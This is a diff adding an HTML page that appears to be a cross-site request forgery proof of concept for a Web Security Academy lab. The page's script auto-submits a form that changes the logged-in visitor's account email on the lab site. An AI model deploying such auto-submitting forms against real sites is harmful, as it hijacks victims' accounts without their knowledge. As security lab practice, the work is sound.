@@ -1,0 +1,23 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>Document</title>
+  </head>
+  <body>
+    <form
+      id="CSRF_POC"
+      class="login-form"
+      name="change-email-form"
+      action="https://0aa700500439f974801e10d7000500fa.web-security-academy.net/my-account/change-email"
+      method="POST"
+    >
+      <label>Email</label>
+      <input required type="email" name="email" value="huhu@gmail.com" />
+    </form>
+    <script>
+      document.getElementById("CSRF_POC").submit();
+    </script>
+  </body>
+</html>
